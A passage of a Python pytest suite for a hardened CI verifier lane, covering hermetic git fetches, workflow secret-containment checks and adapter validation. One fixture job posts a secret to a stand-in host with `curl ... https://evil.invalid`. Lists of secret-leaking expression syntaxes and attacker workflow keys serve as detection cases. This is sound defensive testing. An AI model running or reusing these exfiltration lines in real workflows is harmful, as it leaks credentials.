    assert env["GIT_CONFIG_NOSYSTEM"] == "1"
    assert env["GIT_CONFIG_GLOBAL"] == "/dev/null"
    assert env["GIT_EXTERNAL_DIFF"] == ""
    assert env["GIT_TERMINAL_PROMPT"] == "0"
    assert env["GIT_ALLOW_PROTOCOL"] == "https"
    forced = dict(pair.split("=", 1)
                  for pair in candidatefetch.HERMETIC_GIT_CONFIG)
    assert forced["core.hooksPath"] == "/dev/null"
    assert forced["diff.external"] == ""
    assert forced["protocol.file.allow"] == "never"
    assert forced["fetch.recurseSubmodules"] == "no"


def test_git_failure_refuses_without_echoing_repository_text(candidate_origin):
    """stderr can carry candidate content; only its length may be reported."""
    with pytest.raises(errors.LaneRefusal) as excinfo:
        candidatefetch.git(["cat-file", "blob", "deadbeef" * 5 + ":nope"],
                           cwd=candidate_origin["path"],
                           operation="test-missing-blob")
    assert "git_nonzero_exit" in excinfo.value.reason
    assert "stderr_bytes=" in excinfo.value.reason
    assert "fatal" not in excinfo.value.reason.lower()


def test_git_invocation_failure_refuses(tmp_path):
    with _refusal("git_invocation_failed"):
        candidatefetch.git(["status"], cwd=str(tmp_path / "absent"),
                           operation="test-bad-cwd")


def _plain_clone(origin, destination, *extra):
    """Clone with the test's own git, not the lane's.

    Deliberate: `verify_clone` must be exercisable against a real repository
    without adding a `_source_for_tests` parameter to the fetch path. A hook
    that lets a caller redirect where the candidate comes from is precisely the
    bypass this lane exists to refuse, so the production code has none and the
    test supplies the clone the way a real fetch would have left it."""
    subprocess.run(("git", "clone", "--quiet", "--no-checkout", "--no-tags",
                    *extra, origin, destination),
                   capture_output=True, check=True)
    return destination


def test_verify_clone_accepts_full_history_without_a_working_tree(
        candidate_origin, tmp_path):
    """The clone is data: full history, no checkout, both endpoints present."""
    destination = _plain_clone(candidate_origin["path"], str(tmp_path / "clone"))
    record = candidatefetch.verify_clone(
        destination=destination, head_sha=candidate_origin["head"],
        target_base_sha=candidate_origin["base"])
    assert record["full_history"] is True
    assert record["checked_out"] is False
    assert not (Path(destination) / "a.txt").exists()
    assert candidatefetch.blob_digest(
        candidate_origin["head"], "a.txt", cwd=destination) == \
        hashlib.sha256(b"head\n").hexdigest()
    left = candidatefetch.range_diff_digest(
        candidate_origin["base"], candidate_origin["head"], cwd=destination)
    right = candidatefetch.range_diff_digest(
        candidate_origin["base"], candidate_origin["head"], cwd=destination)
    assert left == right


def test_verify_clone_refuses_a_commit_that_is_not_present(
        candidate_origin, tmp_path):
    destination = _plain_clone(candidate_origin["path"], str(tmp_path / "c"))
    with _refusal("git_nonzero_exit"):
        candidatefetch.verify_clone(destination=destination, head_sha=SHA_B,
                                    target_base_sha=candidate_origin["base"])


def test_a_shallow_clone_refuses(candidate_origin, tmp_path):
    """A shallow clone makes a missing historical object look like a pass."""
    destination = _plain_clone(candidate_origin["path"],
                               str(tmp_path / "shallow"),
                               "--depth", "1", "--no-local")
    with _refusal("candidate_clone_is_shallow"):
        candidatefetch.verify_clone(
            destination=destination, head_sha=candidate_origin["head"],
            target_base_sha=candidate_origin["head"])


@pytest.mark.parametrize("field", ["remote_url", "repository", "remote",
                                   "origin"])
def test_the_candidate_source_is_not_a_parameter(field, tmp_path):
    """The old signature took `remote_url=`. That was the hole.

    It was only ever going to be this repository — right up until something
    upstream computed it. Then whoever controls that computation controls whose
    commits get reviewed, and the numeric-id check downstream is verifying the
    id of the attacker's server. Removing the parameter makes the id check
    compare two things the caller could not both have chosen.

    Refused loudly rather than ignored: a caller still passing it believes it
    is choosing the source, and dropping the argument on the floor would leave
    that belief intact and the call site unaudited."""
    with _refusal("candidate_source_is_not_a_parameter"):
        candidatefetch.fetch_candidate(
            destination=str(tmp_path / "c"), head_sha=SHA_B,
            target_base_sha=SHA_A, **{field: "https://evil.invalid/x.git"})


def test_an_unknown_fetch_argument_is_refused(tmp_path):
    with _refusal("unknown_fetch_argument"):
        candidatefetch.fetch_candidate(
            destination=str(tmp_path / "c"), head_sha=SHA_B,
            target_base_sha=SHA_A, depth=1)


def test_the_canonical_remote_is_https_and_fixed_in_policy():
    url = candidatefetch.canonical_remote_url()
    assert url.startswith("https://")
    assert url == CANONICAL_REMOTE_URL
    assert CANONICAL_REPOSITORY == "mglaeser/bubble-regime-monitor"
    # ssh/file/bare-path can never be reached: there is no input to reach them
    # with, so the check is that the constant itself is https.
    assert "@" not in url and not url.startswith("file:")


def test_fetch_candidate_refuses_a_malformed_sha_before_cloning(tmp_path):
    """Order matters: a malformed sha must refuse before any network reach."""
    destination = tmp_path / "c"
    with _refusal("commit_sha_malformed"):
        candidatefetch.fetch_candidate(
            destination=str(destination), head_sha="nope",
            target_base_sha=SHA_A)
    assert not destination.exists()


def test_no_credential_reaches_the_git_child_process(monkeypatch):
    """§18 E9 — a secret must not be available to a candidate-facing process.

    `HERMETIC_GIT_ENV` is a whitelist, not a filter. Filtering an inherited
    environment is the version that fails: a name nobody thought of survives.
    Checked empirically against two planted variables — one with the obvious
    name, one with a name no filter would predict."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-planted-must-never-appear")
    monkeypatch.setenv("ZZ_UNEXPECTED_CREDENTIAL", "also-planted")
    passed = {}

    def capture(command, **kwargs):
        passed.update(kwargs.get("env") or {})

        class Result:
            returncode = 0
            stdout = b""
            stderr = b""
        return Result()

    monkeypatch.setattr(candidatefetch.subprocess, "run", capture)
    candidatefetch.git(["rev-parse", "HEAD"], operation="env-probe")
    assert passed == dict(candidatefetch.HERMETIC_GIT_ENV)
    assert "OPENAI_API_KEY" not in passed
    assert "ZZ_UNEXPECTED_CREDENTIAL" not in passed
    assert "planted" not in json.dumps(passed)
    for name in passed:
        assert not any(marker in name.upper()
                       for marker in CREDENTIAL_ENV_MARKERS), name


def test_the_child_environment_really_is_what_the_child_sees(candidate_origin,
                                                             monkeypatch):
    """Not only the dict — the process.

    `git var -l` reports its own environment, so a leaked GIT_AUTHOR_NAME would
    appear in its output. Asserting the dict alone would pass even if `git()`
    stopped passing `env` at all."""
    monkeypatch.setenv("GIT_AUTHOR_NAME", "leaked-author")
    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "leaked@example.invalid")
    out = subprocess.run(
        ["git", "var", "-l"], cwd=candidate_origin["path"],
        capture_output=True, env=dict(candidatefetch.HERMETIC_GIT_ENV))
    assert b"leaked-author" not in out.stdout
    assert b"leaked@example.invalid" not in out.stdout


def test_oversized_git_output_refuses(candidate_origin, monkeypatch):
    monkeypatch.setattr(candidatefetch, "MAX_OUTPUT_BYTES", 1)
    with _refusal("git_output_oversized"):
        candidatefetch.git(["rev-parse", "HEAD"],
                           cwd=candidate_origin["path"],
                           operation="test-oversized")


# --------------------------------------------------------------------------
# Operator prerequisites authorize nothing from inside the branch.
# --------------------------------------------------------------------------

def test_sixteen_prerequisites_default_to_none_satisfied():
    status = prerequisites.prerequisite_status()
    assert status["prerequisite_count"] == 16
    assert status["satisfied"] == []
    assert len(status["outstanding"]) == 16
    assert status["all_satisfied"] is False
    assert status["real_calls_authorized"] is False
    assert status["generation_authorized"] is False


def test_prerequisite_status_is_digest_bound():
    a = prerequisites.prerequisite_status()
    b = prerequisites.prerequisite_status()
    assert a["prerequisite_status_sha256"] == b["prerequisite_status_sha256"]
    c = prerequisites.prerequisite_status(["verify_run_404"])
    assert c["prerequisite_status_sha256"] != a["prerequisite_status_sha256"]


def test_an_unknown_prerequisite_key_refuses():
    with _refusal("unknown_prerequisite_key"):
        prerequisites.prerequisite_status(["not_a_real_prerequisite"])


def test_claiming_every_prerequisite_still_refuses_real_calls():
    """The decisive negative test: the record is writable by its own caller."""
    everything = [p.key for p in prerequisites.OPERATOR_PREREQUISITES]
    status = prerequisites.prerequisite_status(everything)
    assert status["all_satisfied"] is True
    assert status["real_calls_authorized"] is False
    with _refusal("real_calls_not_authorized_in_D0"):
        prerequisites.assert_real_calls_authorized(status)


def test_generation_is_a_separate_decision_and_also_refused():
    everything = [p.key for p in prerequisites.OPERATOR_PREREQUISITES]
    status = prerequisites.prerequisite_status(everything)
    with _refusal("generation_not_authorized_in_D0"):
        prerequisites.assert_generation_authorized(status)


def test_prerequisite_record_states_its_own_unverifiability():
    assert "verifies none of it" in \
        prerequisites.prerequisite_status()["honest_scope"]


# --------------------------------------------------------------------------
# Closure: a template, never a claim.
# --------------------------------------------------------------------------

def test_closure_template_is_empty_and_open():
    record = closure.closure_template()
    assert record["closure_state"] == closure.OPEN
    assert all(record[field] is None for field in closure.CLOSURE_FIELDS)
    assert record["closure_template_sha256"]


def test_an_incomplete_closure_refuses():
    with _refusal("closure_incomplete"):
        closure.assert_closure_complete(closure.closure_template())


def test_a_complete_looking_closure_still_cannot_be_signed_in_d0():
    record = {field: "x" for field in closure.CLOSURE_FIELDS}
    with _refusal("closure_cannot_be_signed_in_D0"):
        closure.assert_closure_complete(record)


def test_evidence_only_delta_accepts_evidence_paths():
    record = closure.evidence_only_delta(
        ["audit/14-report.md", "artifacts/plan.json", "docs/x.md",
         "governance/y.md"])
    assert record["evidence_only"] is True
    assert record["source_changed_paths"] == []
    # A workflow is executable code with credential reach, so it is NOT
    # evidence — see test_review_a_credential_workflow_added_after_the_cutoff.
    assert closure.evidence_only_delta(
        [".github/workflows/ci.yml"])["evidence_only"] is False


@pytest.mark.parametrize("path", [
    "scripts/trustedlane/identity.py",
    "app/config.py",
    "tests/test_trusted_lane_bootstrap.py",
    "pyproject.toml",
])
def test_a_source_change_after_the_cutoff_is_not_evidence_only(path):
    record = closure.evidence_only_delta(["audit/14.md", path])
    assert record["evidence_only"] is False
    assert record["source_changed_paths"] == [path]


def test_evidence_only_delta_digest_is_order_independent():
    left = closure.evidence_only_delta(["audit/a.md", "docs/b.md"])
    right = closure.evidence_only_delta(["docs/b.md", "audit/a.md"])
    assert left["delta_sha256"] == right["delta_sha256"]


# --------------------------------------------------------------------------
# The response normalization adapter (MC4-R14).
# --------------------------------------------------------------------------

def _verdict(unit="a" * 64, **overrides):
    base = {"unit_sha256": unit, "decision": "approve", "reason": "because",
            "proof_of_check": "checked the diff", "lens_id": "lens-v2",
            "checked_categories": ["one", "two"]}
    base.update(overrides)
    return base


def _adapter_identity(**overrides):
    base = {"normalization_version": adapter.NORMALIZATION_VERSION,
            "adapter_source": adapter.TRUSTED_ADAPTER_SOURCES[0],
            "adapter_sha256": DIGEST}
    base.update(overrides)
    return base


def _raw_binding(**overrides):
    base = {"raw_response_sha256": DIGEST, "raw_response_bytes": 1234,
            "http_status": 200, "model_id": "gpt-5.6-sol",
            "request_semantics_sha256": DIGEST, "attempt": 1}
    base.update(overrides)
    return base


def test_the_d0_adapter_refuses_to_parse_a_response():
    with _refusal("normalization_not_implemented_in_D0"):
        adapter.normalize(b'{"output": []}')


@pytest.mark.parametrize("source", adapter.CANDIDATE_ADAPTER_SOURCES)
def test_a_candidate_supplied_adapter_refuses(source):
    """If the reviewed package defines how answers are read, it defines the
    answers."""
    with _refusal("adapter_from_candidate"):
        adapter.assert_adapter_is_trusted(
            _adapter_identity(adapter_source=source))


def test_an_unknown_adapter_source_refuses():
    with _refusal("adapter_source_not_permitted"):
        adapter.assert_adapter_is_trusted(
            _adapter_identity(adapter_source="SOMEWHERE"))


def test_an_adapter_version_mismatch_refuses():
    with _refusal("adapter_version_mismatch"):
        adapter.assert_adapter_is_trusted(
            _adapter_identity(normalization_version="v0"))


@pytest.mark.parametrize("field", adapter.ADAPTER_IDENTITY_FIELDS)
def test_an_incomplete_adapter_identity_refuses(field):
    with _refusal("adapter_identity_incomplete"):
        adapter.assert_adapter_is_trusted(_adapter_identity(**{field: ""}))


def test_a_trusted_adapter_is_shape_checked_not_authenticated():
    record = adapter.assert_adapter_is_trusted(_adapter_identity())
    assert record["adapter_trusted_shape"] is True
    assert record["adapter_authenticated"] is False


@pytest.mark.parametrize("transform", adapter.FORBIDDEN_TRANSFORMS)
def test_every_forbidden_transform_refuses(transform):
    with _refusal("adapter_forbidden_transform"):
        adapter.assert_no_forbidden_transform([transform])


@pytest.mark.parametrize("count", [0, 2, 17])
def test_more_or_fewer_than_one_output_block_refuses(count):
    with _refusal("raw_output_not_single"):
        adapter.assert_single_output(count)


@pytest.mark.parametrize("count", [True, "1", 1.0, None])
def test_a_non_integer_output_count_refuses(count):
    with _refusal("raw_output_count_not_integer"):
        adapter.assert_single_output(count)


def test_a_valid_normalized_verdict_round_trips():
    assert adapter.validate_normalized_verdict(_verdict()) == _verdict()


@pytest.mark.parametrize("decision", ["APPROVE", "approved", "yes", "", None,
                                       " approve"])
def test_a_decision_outside_the_vocabulary_refuses(decision):
    with _refusal("normalized_decision_not_permitted"):
        adapter.validate_normalized_verdict(_verdict(decision=decision))


def test_an_unknown_normalized_field_refuses():
    """An adapter that tolerates an extra key cannot notice a provider change."""
    with _refusal("normalized_verdict_unknown_field"):
        adapter.validate_normalized_verdict(_verdict(findings=[]))


@pytest.mark.parametrize("field", sorted(adapter.NORMALIZED_VERDICT_FIELDS))
def test_a_missing_normalized_field_refuses(field):
    verdict = _verdict()
    verdict.pop(field)
    with _refusal("normalized_verdict_field_missing"):
        adapter.validate_normalized_verdict(verdict)


@pytest.mark.parametrize("categories", [
    "one",              # a scalar is not a list; coercion is forbidden
    [],
    ["one", ""],
    ["one", 2],
    ["one", "one"],
])
def test_malformed_checked_categories_refuse(categories):
    with pytest.raises(errors.LaneRefusal):
        adapter.validate_normalized_verdict(
            _verdict(checked_categories=categories))


@pytest.mark.parametrize("field", ["unit_sha256", "reason", "proof_of_check",
                                    "lens_id"])
def test_an_empty_or_non_string_text_field_refuses(field):
    with _refusal("normalized_field_not_nonempty_string"):
        adapter.validate_normalized_verdict(_verdict(**{field: ""}))


def test_the_normalization_record_binds_raw_bytes_to_normalized_verdicts():
    record = adapter.normalization_record(
        raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict()])
    assert record["raw_response_sha256"] == DIGEST
    assert record["normalized_verdicts_sha256"]
    assert record["adapter_authenticated"] is False


def test_the_normalization_digest_is_order_independent():
    left = adapter.normalization_record(
        raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict("a" * 64), _verdict("b" * 64)])
    right = adapter.normalization_record(
        raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict("b" * 64), _verdict("a" * 64)])
    assert left["normalized_verdicts_sha256"] == \
        right["normalized_verdicts_sha256"]


def test_a_changed_verdict_changes_the_normalization_digest():
    left = adapter.normalization_record(
        raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict()])
    right = adapter.normalization_record(
        raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict(decision="reject")])
    assert left["normalized_verdicts_sha256"] != \
        right["normalized_verdicts_sha256"]


def test_a_duplicated_unit_in_one_response_refuses():
    with _refusal("normalized_verdict_unit_duplicated"):
        adapter.normalization_record(
            raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
            normalized_verdicts=[_verdict(), _verdict()])


@pytest.mark.parametrize("field", adapter.RAW_BINDING_FIELDS)
def test_an_incomplete_raw_binding_refuses(field):
    with _refusal("raw_binding_incomplete"):
        adapter.normalization_record(
            raw_binding=_raw_binding(**{field: None}),
            adapter_identity=_adapter_identity(),
            normalized_verdicts=[_verdict()])


def test_the_normalization_record_is_json_serializable():
    record = adapter.normalization_record(
        raw_binding=_raw_binding(), adapter_identity=_adapter_identity(),
        normalized_verdicts=[_verdict()])
    assert json.loads(json.dumps(record, sort_keys=True))


# --------------------------------------------------------------------------
# Refusals must be typed, and must not carry untrusted text.
# --------------------------------------------------------------------------

def test_refusals_are_typed_with_a_code():
    with pytest.raises(errors.LaneRefusal) as excinfo:
        errors.refuse("category=example")
    assert excinfo.value.code == errors.TRUSTED_LANE_REFUSED
    assert excinfo.value.reason == "category=example"


def test_every_lane_refusal_names_a_category():
    """A refusal without a category cannot be handled programmatically."""
    for path in _lane_sources():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if not (isinstance(node, ast.Call)
                    and getattr(node.func, "id", None) == "refuse"):
                continue
            if not node.args:
                continue
            first = node.args[0]
            text = None
            if isinstance(first, ast.Constant):
                text = first.value
            elif isinstance(first, ast.JoinedStr) and first.values:
                head = first.values[0]
                text = head.value if isinstance(head, ast.Constant) else ""
            assert text is None or text.startswith("category="), \
                f"{path.name}:{node.lineno}"


# --------------------------------------------------------------------------
# A ref NAME is not branch protection. Observed, not assumed.
# --------------------------------------------------------------------------


def test_a_protected_ref_name_is_not_a_protection_check():
    """The two must stay separate, because the world disagreed with the docs.

    Every document in this programme calls `main` "protected/default main". At
    the time this was written the GitHub API reported it
    `"protected": false`. `assert_protected_ref` passes on the NAME and would
    have said nothing."""
    assert identity.assert_protected_ref("refs/heads/main") == "refs/heads/main"
    with _refusal("branch_not_protected"):
        identity.assert_branch_protection_observed(
            {"name": "main", "protected": False})


def test_an_unobserved_branch_protection_is_refused_separately():
    """"Nobody looked" and "looked, and it is off" are different failures with
    different fixes, so they get different refusals."""
    with _refusal("branch_protection_not_observed"):
        identity.assert_branch_protection_observed(None)


def test_a_protected_branch_record_is_accepted_with_an_honest_scope():
    record = identity.assert_branch_protection_observed(
        {"name": "main", "protected": True})
    assert record["protected"] is True
    assert "separate question" in record["honest_scope"]


@pytest.mark.parametrize("observed", [
    {"name": "fix/verifier-trusted-lane-bootstrap", "protected": True},
    {"name": "claude/bubblegauge-build-spec-fzthju", "protected": True},
])
def test_a_protected_branch_that_is_not_the_protected_ref_is_refused(observed):
    """Protecting some other branch does not make it the trusted ref."""
    with _refusal("branch_record_is_not_the_protected_ref"):
        identity.assert_branch_protection_observed(observed)


def test_a_non_object_branch_record_is_refused():
    with _refusal("branch_record_not_object"):
        identity.assert_branch_protection_observed("main")


# --------------------------------------------------------------------------
# Findings from the external review panel on the bootstrap PR (#26).
#
# All three were reported by the required approver (gpt-5.6-sol), reproduced
# here first, then fixed. Each test is the reproduction.
# --------------------------------------------------------------------------


def test_panel_f1_a_forbidden_transform_declared_as_a_bare_string_is_refused():
    """`tuple("DROP_UNKNOWN_FIELD")` is twenty characters, none of them a
    transform name — so the most natural way to declare exactly one bypass
    passed the gate untouched."""
    with _refusal("adapter_transforms_not_a_sequence"):
        adapter.assert_no_forbidden_transform("DROP_UNKNOWN_FIELD")


@pytest.mark.parametrize("transform", sorted(adapter.FORBIDDEN_TRANSFORMS))
def test_panel_f1_every_forbidden_transform_is_still_caught_in_a_list(transform):
    with _refusal("adapter_forbidden_transform"):
        adapter.assert_no_forbidden_transform([transform])


def test_panel_f1_a_non_string_transform_is_refused():
    with _refusal("adapter_transform_not_a_string"):
        adapter.assert_no_forbidden_transform([object()])


def test_panel_f1_none_and_empty_remain_permitted():
    assert adapter.assert_no_forbidden_transform(None) == ()
    assert adapter.assert_no_forbidden_transform([]) == ()


def test_panel_f2_a_clone_with_a_working_tree_is_refused(candidate_origin,
                                                         tmp_path):
    """The record used to say `checked_out: False` without checking.

    An ordinary `git clone` has a full worktree, and that record certified it
    inert — an attestation about the one property that decides whether fetched
    commits are data or code."""
    destination = str(tmp_path / "checked-out")
    subprocess.run(["git", "clone", "--quiet", candidate_origin["path"],
                    destination], capture_output=True, check=True)
    assert (Path(destination) / "a.txt").exists(), "fixture needs a worktree"
    with _refusal("candidate_clone_has_a_working_tree"):
        candidatefetch.verify_clone(
            destination=destination, head_sha=candidate_origin["head"],
            target_base_sha=candidate_origin["base"])


def test_panel_f2_the_no_checkout_clone_records_how_it_verified(
        candidate_origin, tmp_path):
    destination = _plain_clone(candidate_origin["path"], str(tmp_path / "c"))
    record = candidatefetch.verify_clone(
        destination=destination, head_sha=candidate_origin["head"],
        target_base_sha=candidate_origin["base"])
    assert record["checked_out"] is False
    assert "ls-files" in record["checked_out_verified_by"]
    assert "no working tree exists" in record["honest_scope"]


def test_panel_f3_evidence_only_delta_accepts_a_generator(tmp_path):
    """`paths` was walked three times; a generator is exhausted by the first.

    The caller got a correct source list beside a count of 0 and a digest of
    the EMPTY list — a closure binding that was a digest of nothing while the
    record looked populated."""
    supplied = ["audit/a.md", "scripts/verifier/x.py", "docs/b.md"]
    from_generator = closure.evidence_only_delta(p for p in supplied)
    from_list = closure.evidence_only_delta(supplied)
    assert from_generator == from_list
    assert from_generator["changed_path_count"] == 3
    assert from_generator["source_changed_paths"] == ["scripts/verifier/x.py"]
    assert from_generator["delta_sha256"] != closure.evidence_only_delta(
        [])["delta_sha256"]


def test_panel_f3_a_non_string_path_is_refused():
    with _refusal("closure_delta_path_not_a_string"):
        closure.evidence_only_delta(["audit/a.md", None])


# --------------------------------------------------------------------------
# Bootstrap PR review: the secret detector was a substring match.
#
# `secrets.` misses everything GitHub also supports. The dangerous direction is
# not D0 naming a secret — it is a D1/D2 job REACHING one without being
# recognised as credential-bearing, which escapes the environment gate and the
# containment gate at the same time.
# --------------------------------------------------------------------------

SECRET_SYNTAXES = [
    "${{ secrets.TRUSTED_VERIFIER_OPENAI_KEY }}",
    "${{ secrets['TRUSTED_VERIFIER_OPENAI_KEY'] }}",
    '${{ secrets["TRUSTED_VERIFIER_OPENAI_KEY"] }}',
    "${{ toJSON(secrets) }}",
    "${{ secrets[format('TRUSTED_{0}_KEY', 'VERIFIER')] }}",
    "${{ fromJSON(toJSON(secrets)).TRUSTED_VERIFIER_OPENAI_KEY }}",
]


@pytest.mark.parametrize("expression", SECRET_SYNTAXES)
def test_review_d0_may_not_name_a_secret_in_any_syntax(expression):
    document = _document(D0)
    document["jobs"]["d0-containment"]["steps"][0].setdefault("env", {})
    document["jobs"]["d0-containment"]["steps"][0]["env"]["LEAK"] = expression
    with _refusal("phase_must_not_name_a_secret"):
        workflowfile.assert_phase_secret_policy(
            document, name=D0, policy=workflowfile.TRUSTED_WORKFLOWS[D0])


@pytest.mark.parametrize("expression", SECRET_SYNTAXES)
def test_review_an_ungated_job_reaching_a_secret_is_detected(expression):
    """The worse half of the bug.

    A job the checker does not recognise as credential-bearing is never asked
    for an `environment:` or a `needs:` — so it reaches the secret with neither
    gate. `toJSON(secrets)` makes that one line and every secret at once."""
    document = _document(D1)
    document["jobs"]["exfiltrate"] = {
        "runs-on": "ubuntu-latest",
        "steps": [{"name": "leak", "env": {"K": expression},
                   "run": "curl -X POST https://evil.invalid -d \"$K\""}],
    }
    with pytest.raises(errors.LaneRefusal) as excinfo:
        workflowfile.assert_secret_containment(document)
    assert ("secret_job_not_environment_gated" in excinfo.value.reason
            or "secret_job_not_gated_behind_containment" in excinfo.value.reason)


@pytest.mark.parametrize("expression", [
    "${{ github.repository_id }}",
    "${{ github.ref }}",
    "${{ inputs.target_base_sha }}",
    "${{ vars.TRUSTED_ENGINE_ARTIFACT_SHA256 }}",
    "no expression at all",
    "the word secrets outside an expression",
    "${{ env.MY_secrets_LIKE_NAME }}",
])
def test_review_benign_expressions_are_not_flagged_as_secrets(expression):
    """A detector that flags everything is a detector nobody keeps."""
    assert workflowfile._secret_references({"env": {"V": expression}}) == []


def test_review_the_detector_finds_the_context_by_identifier_not_by_substring():
    assert workflowfile._secret_references(
        {"a": "${{ secrets.X }}"}) == ["${{ secrets.X }}"]
    assert workflowfile._secret_references(
        {"a": "${{ toJSON(secrets) }}"}) == ["${{ toJSON(secrets) }}"]
    # `foo.secrets` is not the secrets context.
    assert workflowfile._secret_references({"a": "${{ foo.secrets }}"}) == []


# --------------------------------------------------------------------------
# Bootstrap PR review, second batch: the validator enumerated hazards instead
# of refusing by default, so every check had an edge it did not cover.
# --------------------------------------------------------------------------


@pytest.mark.parametrize("key,value", [
    ("uses", "attacker/repo/.github/workflows/x.yml@main"),
    ("secrets", "inherit"),
    ("container", "attacker/image:latest"),
    ("services", {"db": {"image": "attacker/pg:latest"}}),
])
def test_review_forbidden_job_keys_are_refused(key, value):
    """Four job-level surfaces nothing else inspected.

    `assert_actions_pinned` only ever walked `steps[].uses`, so a job-level
    reusable-workflow call — a whole file of someone else's steps — was never
    pin-checked. `secrets: inherit` hands the callee every secret in one word.
    `container:`/`services:` run every step inside an unpinned image."""
    document = _document(D1)
    document["jobs"]["pwn"] = {"runs-on": "ubuntu-latest", key: value}
    with _refusal("forbidden_job_key"):
        workflowfile.assert_forbidden_job_keys_absent(document, name=D1)


def test_review_the_real_workflows_declare_no_forbidden_job_key():
    for name in (D0, D1, D2):
        assert workflowfile.assert_forbidden_job_keys_absent(
            _document(name), name=name)["forbidden_job_keys"] == 0


@pytest.mark.parametrize("condition", [
    "always()", "!cancelled()", "success() || failure()",
    "${{ always() }}",
])
def test_review_a_neutralised_containment_gate_is_refused(condition):
    """`needs:` plus `if: always()` is not gating.

    The job still declares the dependency, so `gated_on` was satisfied — and
    then ran anyway when containment failed."""
    document = _document(D1)
    document["jobs"]["d1-trusted-count"]["if"] = condition
    with _refusal("containment_gate_neutralised"):
        workflowfile.assert_gating_is_not_neutralised(document, name=D1)


def test_review_an_ordinary_condition_on_a_credential_job_is_permitted():
    document = _document(D1)
    document["jobs"]["d1-trusted-count"]["if"] = "inputs.phase == 'D1'"
    assert workflowfile.assert_gating_is_not_neutralised(
        document, name=D1)["neutralised_gates"] == 0


@pytest.mark.parametrize("expression", [
    "${{ env.LAUNDERED }}",
    "${{ steps.pick.outputs.ref }}",
    "${{ inputs.candidate_head_sha }}",
    "${{ github.head_ref }}",
    "${{ vars.REF }}",
])
def test_review_any_expression_in_a_checkout_ref_is_refused(expression):
    """Enumerating hazardous prefixes was the bug — `env.` and `steps.` were
    not on the list, and either can carry an input-derived value. There is no
    legitimate dynamic ref in this lane."""
    document = _document(D1)
    document["jobs"]["d1-trusted-count"]["steps"][0]["with"]["ref"] = expression
    with _refusal("checkout_ref_is_an_expression"):
        workflowfile.assert_checkouts_are_safe(document)


def test_review_a_template_deployed_under_any_filename_is_detected(tmp_path):
    """Filename matching was the bug: two exact basenames, so `.yaml` — or any
    other name — activated the credential phase undetected. GitHub does not
    care what the file is called; it cares what is in it."""
    source = tmp_path / workflowfile.WORKFLOW_DIR
    source.mkdir(parents=True)
    for name in (D0, D1, D2):
        shutil.copy(ROOT / workflowfile.WORKFLOW_DIR / name, source / name)
    live = tmp_path / workflowfile.LIVE_WORKFLOW_DIR
    live.mkdir(parents=True)
    shutil.copy(ROOT / workflowfile.WORKFLOW_DIR / D1,
                live / "totally-innocuous.yaml")
    with _refusal("undeployable_phase_is_live"):
        workflowfile.assert_no_template_is_live(root=str(tmp_path))


def test_review_a_credential_workflow_added_after_the_cutoff_is_not_evidence():
    """`.github/workflows/` used to count as an evidence path, so a
    credential-bearing lane could be added after the code cutoff while the
    closure still claimed the delta changed nothing that runs."""
    record = closure.evidence_only_delta(
        [".github/workflows/d1-trusted-count.yml"])
    assert record["evidence_only"] is False
    assert record["source_changed_paths"] == [
        ".github/workflows/d1-trusted-count.yml"]


def test_review_genuine_evidence_paths_still_classify_as_evidence_only():
    record = closure.evidence_only_delta(
        ["audit/14.md", "artifacts/plan.json", "governance/x.md", "docs/y.md"])
    assert record["evidence_only"] is True


# ---- the copy that runs is the copy that was reviewed ---------------------


def test_review_the_deployed_copy_is_compared_to_its_source(tmp_path):
    """Every other check reads `scripts/…`; GitHub reads `.github/workflows/…`.

    Nothing compared them, so once D0 is deployed the two could diverge with no
    test noticing — and the copy nobody validates is the copy that executes."""
    source = tmp_path / workflowfile.WORKFLOW_DIR
    source.mkdir(parents=True)
    for name in (D0, D1, D2):
        shutil.copy(ROOT / workflowfile.WORKFLOW_DIR / name, source / name)
    live = tmp_path / workflowfile.LIVE_WORKFLOW_DIR
    live.mkdir(parents=True)

    # Identical -> accepted.
    shutil.copy(source / D0, live / D0)
    assert workflowfile.assert_deployed_copy_matches_source(
        root=str(tmp_path))["d0_deployed"] is True

    # One byte different -> refused.
    (live / D0).write_text((source / D0).read_text(encoding="utf-8") + "\n",
                           encoding="utf-8")
    with _refusal("deployed_workflow_differs_from_source"):
        workflowfile.assert_deployed_copy_matches_source(root=str(tmp_path))


def test_review_an_undeployed_d0_says_so_rather_than_passing_silently():
    record = workflowfile.assert_deployed_copy_matches_source(root=str(ROOT))
    assert record["d0_deployed"] is False
    assert "not deployed yet" in record["honest_scope"]


def test_review_the_d0_push_filter_names_the_file_it_will_be_deployed_as():
    """The filter named `trusted-lane-d0-containment.yml`; the file deploys as
    `d0-trusted-lane-containment.yml`. Editing the live workflow would not have
    triggered it."""
    block = _document(D0).get(True) or _document(D0).get("on")
    paths = block["push"]["paths"]
    expected = f"{workflowfile.LIVE_WORKFLOW_DIR}/{D0}"
    assert expected in paths, (expected, paths)


# --------------------------------------------------------------------------
# Bootstrap PR review, third batch.
#
# Five more, and the pattern in all five is the same one the second batch was
# supposed to have ended: a check that asked a proxy question instead of the
# real one. `__init__.py` instead of "is this importable". `if:` instead of
# "can this failure be survived". Jobs instead of the workflow. A filename
# instead of the workflow's identity. The caller's argument instead of the
# checked one.
#
# Two of these were REFUTED by an adversarial verification pass and found open
# anyway by testing the refutation. That is recorded here because it is the
# reason the tests below construct the bypass and run it, rather than reasoning
# about whether it would work.
# --------------------------------------------------------------------------


def test_third_a_namespace_candidate_package_is_reachable_without_init(
        tmp_path):
    """PEP 420: a bare directory is importable, `__init__.py` optional.

    The check required `__init__.py`, so a candidate package without one was
    reported unreachable — while `import verifier.executor` succeeded from the
    same path. Demonstrated below rather than argued: the import is actually
    performed."""
    package = tmp_path / "verifier"
    package.mkdir()
    (package / "executor.py").write_text("VALUE = 'candidate code ran'\n",
                                         encoding="utf-8")
    assert not (package / "__init__.py").exists()

    # It really is importable — this is the fact the old check disagreed with.
    probe = subprocess.run(
        [sys.executable, "-c",
